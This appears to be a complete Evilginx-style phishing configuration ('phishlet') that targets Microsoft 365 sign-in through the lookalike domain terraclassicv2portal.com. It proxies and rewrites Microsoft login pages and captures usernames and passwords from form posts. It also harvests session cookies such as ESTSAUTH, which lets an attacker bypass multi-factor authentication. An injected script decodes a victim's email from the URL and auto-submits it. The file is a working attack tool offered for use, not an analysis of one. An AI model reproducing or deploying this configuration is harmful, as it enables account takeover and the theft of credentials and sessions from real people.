name: '0365'
author: '@Fluxxset (simplified)'
min_ver: '3.3.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'account', domain: 'microsoftonline.com', search: 'https://account.microsoftonline.com', replace: 'https://account.terraclassicv2portal.com', mimes: ['text/html', 'application/javascript', 'application/json']}
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https://aadcdn.msftauth.net', replace: 'https://aadcdn.terraclassicv2portal.com', mimes: ['text/html', 'application/javascript', 'application/json']}
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'www', domain: 'office.com', search: 'https://www.office.com', replace: 'https://www.terraclassicv2portal.com', mimes: ['text/html', 'application/javascript', 'application/json']}
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'www', domain: 'office.com', search: 'https%3A%2F%2Fwww.office.com', replace: 'https%3A%2F%2Fwww.terraclassicv2portal.com', mimes: ['text/html', 'application/javascript', 'application/json']}
  - {triggers_on: 'login.terraclassicv2portal.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https%3A%2F%2Flogin.microsoftonline.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'WLSSC', 'RPSSecAuth', '.*,regexp']
  - domain: '.live.com'
    keys: ['.*,regexp']
  - domain: '.login.live.com'
    keys: ['.*,regexp']

credentials:
  username:
    key: '(login|UserName|username|email|account|identifier|loginfmt)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|password|login_password|pass|pwd)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'

js_inject:
  - trigger_domains: ['login.microsoftonline.com', 'login.live.com']
    trigger_paths: ['/common/oauth2/', '/', '/*', '/common/oauth2/v2.0/authorize']
    script: |
      function lp(){
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(window.location.href)){
          var res = query.split("#");
          var data2 = res[1];
          if (emailId != null) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
              try {
                decodedString = window.atob(data2.replace(/[=]/gi, ''));
              } catch (e) {
                console.error('Error decoding base64 string:', e);
              }
            }
            emailId.focus();
            emailId.value = decodedString;
            nextButton.focus();
            nextButton.click();
            return;
          }
        }
        setTimeout(function(){lp();}, 500);
      }
      setTimeout(function(){lp();}, 500);
